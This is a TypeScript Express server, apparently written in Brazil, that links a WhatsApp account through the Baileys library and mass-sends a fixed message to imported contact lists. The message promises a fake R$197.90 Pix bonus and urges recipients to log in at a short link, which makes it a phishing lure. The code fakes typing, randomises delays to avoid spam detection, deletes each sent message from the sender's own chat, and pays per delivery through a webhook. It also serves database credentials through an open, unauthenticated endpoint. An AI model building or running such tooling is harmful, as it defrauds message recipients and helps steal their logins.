import "dotenv/config";
import fs from "fs";
import express from "express";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";
import { getContactsFromDB, importContacts, getDBCredentials } from "./db-client";

const logger = pino({ level: "silent" });

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

const AUTH_DIR = "auth_info_baileys";
const PORT = 3000;

function clearAuthDir() {
  try {
    if (!fs.existsSync(AUTH_DIR)) {
      fs.mkdirSync(AUTH_DIR, { recursive: true });
      return;
    }
    const files = fs.readdirSync(AUTH_DIR);
    for (const file of files) {
      const filePath = `${AUTH_DIR}/${file}`;
      try {
        if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
          fs.unlinkSync(filePath);
        }
      } catch {
        try {
          fs.writeFileSync(filePath, "{}");
        } catch {
          // ignora
        }
      }
    }
  } catch (err) {
    console.warn("Aviso ao limpar auth_info_baileys:", err);
  }

  try {
    if (!fs.existsSync(AUTH_DIR)) {
      fs.mkdirSync(AUTH_DIR, { recursive: true });
    }
  } catch {
    // ignora
  }
}

export const app = express();

// Middleware de CORS e JSON
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, Origin, Accept");
  if (req.method === "OPTIONS") {
    res.sendStatus(200);
    return;
  }
  next();
});

app.use(express.json());

// Normaliza rotas /api/wa/* para /api/*
app.use((req, _res, next) => {
  if (req.url.startsWith("/api/wa")) {
    req.url = req.url.replace(/^\/api\/wa/, "/api");
  }
  next();
});

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

let waVersion: [number, number, number] = [2, 3000, 1035194821];

// Busca a versão mais recente do Baileys ao iniciar
fetchLatestBaileysVersion()
  .then(({ version }) => {
    waVersion = version;
  })
  .catch((err) => {
    console.warn("Aviso: falha ao buscar versão do Baileys. Usando fallback.", err);
  });

// ──────────────────────────────────────────────────────────
// Conexão principal com o WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp(): Promise<WASocket> {
  if (!fs.existsSync(AUTH_DIR)) {
    fs.mkdirSync(AUTH_DIR, { recursive: true });
  }

  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version: waVersion,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: Browsers.ubuntu("Chrome"),
    markOnlineOnConnect: true,
  });

  sock.ev.on("connection.update", async (update: Partial<ConnectionState>) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = (lastDisconnect?.error as Boom)?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      console.log(`Conexão fechada — código: ${statusCode}, reconectar: ${shouldReconnect}`);
      connectionStatus = "close";

      // Limpa o socket atual
      try {
        sock?.ev.removeAllListeners("connection.update");
        sock?.ev.removeAllListeners("creds.update");
        sock?.end(undefined);
      } catch {
        // ignora erros no encerramento
      }
      sock = null;

      // Só reconecta se houver credenciais salvas e o motivo não for logout
      const hasCredentials = fs.existsSync(`${AUTH_DIR}/creds.json`);
      if (shouldReconnect && hasCredentials) {
        console.log("Credenciais ativas encontradas. Reconectando em 5s...");
        await delay(5000);
        connectToWhatsApp().catch((err) => console.error("Erro ao reconectar:", err));
      } else {
        console.log("Não reconectando: sessão encerrada ou inexistente.");
      }
    } else if (connection === "open") {
      console.log("✅ WhatsApp conectado com sucesso!");
      connectionStatus = "open";
      pairingCode = null;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}

// Inicialização silenciosa se já houver sessão ativa
if (fs.existsSync(`${AUTH_DIR}/creds.json`)) {
  console.log("Sessão anterior encontrada. Conectando ao WhatsApp...");
  connectToWhatsApp().catch((err) => console.error("Erro ao iniciar conexão:", err));
}

// ──────────────────────────────────────────────────────────
// Webhook de retorno de disparos
// ──────────────────────────────────────────────────────────
async function triggerWebhook(status: string, target: string, messageId: string): Promise<void> {
  const webhookUrl = process.env.WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    await axios.post(webhookUrl, {
      status,
      target,
      messageId,
      timestamp: new Date().toISOString(),
      reward: 0.1,
    });
  } catch (err) {
    console.error("Erro ao disparar Webhook:", err);
  }
}

// ──────────────────────────────────────────────────────────
// LÓGICA DE NEGÓCIO DOS ENDPOINTS
// ──────────────────────────────────────────────────────────

async function handleConnectService(phone: string) {
  if (!phone) {
    throw new Error("Telefone é obrigatório");
  }

  const cleanPhone = String(phone).replace(/\D/g, "");
  console.log(`Iniciando pareamento para: ${cleanPhone}`);

  if (sock) {
    try {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
      sock.end(undefined);
    } catch {
      // ignora
    }
    sock = null;
  }

  clearAuthDir();

  connectionStatus = "close";
  pairingCode = null;

  await connectToWhatsApp();

  let code: string | undefined;
  for (let attempt = 0; attempt < 3; attempt++) {
    await new Promise((resolve) => setTimeout(resolve, 1200));
    if (sock) {
      try {
        code = await sock.requestPairingCode(cleanPhone);
        if (code) break;
      } catch (err) {
        console.warn(
          `Tentativa ${attempt + 1} de gerar pairing code falhou, aguardando WS...`,
          err,
        );
      }
    }
  }

  if (!code) {
    throw new Error("Não foi possível gerar o código de pareamento. Verifique o número informado.");
  }

  pairingCode = code;
  connectionStatus = "pairing";

  return { pairingCode: code };
}

async function handleDisconnectService() {
  if (sock) {
    try {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
      await sock.logout();
      sock.end(undefined);
    } catch {
      // ignora erros no logout
    }
    sock = null;
  }

  clearAuthDir();

  pairingCode = null;
  connectionStatus = "close";

  return { success: true };
}

function startDisparoBackground(targets: unknown[]) {
  if (!sock || connectionStatus !== "open") {
    throw new Error("WhatsApp não conectado");
  }

  if (!Array.isArray(targets) || targets.length === 0) {
    throw new Error("Lista de alvos inválida");
  }

  // Executa em segundo plano
  (async () => {
    for (const targetRaw of targets) {
      try {
        const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";

        const typingMs = Math.floor(Math.random() * (12000 - 7000 + 1)) + 7000;
        await sock?.sendPresenceUpdate("composing", target);
        await delay(typingMs);
        await sock?.sendPresenceUpdate("paused", target);

        const sentMsg = await sock?.sendMessage(target, { text: FIXED_MESSAGE });

        if (sentMsg) {
          await sock?.chatModify(
            {
              delete: true,
              lastMessages: [
                {
                  key: sentMsg.key,
                  messageTimestamp: sentMsg.messageTimestamp ?? 0,
                },
              ],
            },
            target,
          );

          await triggerWebhook("success", target, sentMsg.key.id ?? "");
        }

        const nextDelay = Math.floor(Math.random() * (45000 - 30000 + 1)) + 30000;
        console.log(`✉️ Enviado para ${target}. Próximo em ${nextDelay / 1000}s...`);
        await delay(nextDelay);
      } catch (err) {
        console.error(`Erro ao disparar para ${targetRaw}:`, err);
      }
    }
  })();

  return { status: "queueing", count: targets.length };
}

// ──────────────────────────────────────────────────────────
// ROTAS EXPRESS
// ──────────────────────────────────────────────────────────

app.get("/api/status", (_req, res) => {
  res.json({
    status: connectionStatus,
    pairingCode,
    connectedAs: sock?.authState?.creds?.me?.id ?? null,
  });
});

app.post("/api/connect", async (req, res) => {
  try {
    const { phone } = (req.body ?? {}) as { phone?: string };
    const result = await handleConnectService(phone ?? "");
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao gerar pairing code:", msg);
    res.status(500).json({ error: msg });
  }
});

app.post("/api/disconnect", async (_req, res) => {
  try {
    const result = await handleDisconnectService();
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro ao desconectar:", msg);
    res.status(500).json({ error: msg });
  }
});

app.post("/api/disparar", (req, res) => {
  try {
    const { targets } = (req.body ?? {}) as { targets?: unknown[] };
    const result = startDisparoBackground(targets ?? []);
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    res.status(400).json({ error: msg });
  }
});

app.get("/api/contatos", async (_req, res) => {
  try {
    const result = await getContactsFromDB();
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

app.post("/api/contatos/importar", async (req, res) => {
  const { phones } = (req.body ?? {}) as { phones?: unknown };
  if (!phones || !Array.isArray(phones)) {
    res.status(400).json({
      success: false,
      error: "Formato inválido. Esperado: { phones: string[] }",
    });
    return;
  }

  try {
    const result = await importContacts(phones as string[]);
    res.json(result);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error("Erro em /api/contatos/importar:", msg);
    res.status(500).json({ success: false, error: msg });
  }
});

app.get("/api/db-credentials", (_req, res) => {
  try {
    const creds = getDBCredentials();
    res.json(creds);
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    res.status(500).json({ success: false, error: msg });
  }
});

// ──────────────────────────────────────────────────────────
// Inicia o servidor Express se executado diretamente
// ──────────────────────────────────────────────────────────
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 WhatsApp Server rodando na porta ${PORT}`);
});

// ──────────────────────────────────────────────────────────
// Handler Web Request para integração com src/server.ts (SSR / Cloud Run)
// ──────────────────────────────────────────────────────────
function jsonResponse(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
    },
  });
}

export async function handleWhatsappApiRequest(request: Request): Promise<Response | null> {
  const url = new URL(request.url);
  let pathname = url.pathname;

  if (request.method === "OPTIONS") {
    return new Response(null, {
      status: 200,
      headers: {
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS, PUT, DELETE",
      },
    });
  }

  if (pathname.startsWith("/api/wa")) {
    pathname = pathname.replace(/^\/api\/wa/, "/api");
  }

  if (!pathname.startsWith("/api")) {
    return null;
  }

  const endpoint = pathname.replace(/^\/api/, "");
  const validEndpoints = [
    "/status",
    "/connect",
    "/disconnect",
    "/disparar",
    "/contatos",
    "/contatos/importar",
    "/db-credentials",
  ];

  if (!validEndpoints.includes(endpoint)) {
    return null;
  }

  try {
    if (endpoint === "/status" && request.method === "GET") {
      return jsonResponse({
        status: connectionStatus,
        pairingCode,
        connectedAs: sock?.authState?.creds?.me?.id ?? null,
      });
    }

    if (endpoint === "/connect" && request.method === "POST") {
      let body: { phone?: string } = {};
      try {
        body = (await request.json()) as { phone?: string };
      } catch {
        // ignore
      }

      const result = await handleConnectService(body.phone ?? "");
      return jsonResponse(result);
    }

    if (endpoint === "/disconnect" && request.method === "POST") {
      const result = await handleDisconnectService();
      return jsonResponse(result);
    }

    if (endpoint === "/disparar" && request.method === "POST") {
      let body: { targets?: unknown[] } = {};
      try {
        body = (await request.json()) as { targets?: unknown[] };
      } catch {
        // ignore
      }

      const result = startDisparoBackground(body.targets ?? []);
      return jsonResponse(result);
    }

    if (endpoint === "/contatos" && request.method === "GET") {
      const result = await getContactsFromDB();
      return jsonResponse(result);
    }

    if (endpoint === "/contatos/importar" && request.method === "POST") {
      let body: { phones?: unknown } = {};
      try {
        body = (await request.json()) as { phones?: unknown };
      } catch {
        // ignore
      }

      const { phones } = body;
      if (!phones || !Array.isArray(phones)) {
        return jsonResponse(
          { success: false, error: "Formato inválido. Esperado: { phones: string[] }" },
          400,
        );
      }

      const result = await importContacts(phones as string[]);
      return jsonResponse(result);
    }

    if (endpoint === "/db-credentials" && request.method === "GET") {
      const creds = getDBCredentials();
      return jsonResponse(creds);
    }

    return null;
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error(`Erro no endpoint ${endpoint}:`, msg);
    return jsonResponse({ error: msg }, 500);
  }
}

export default app;
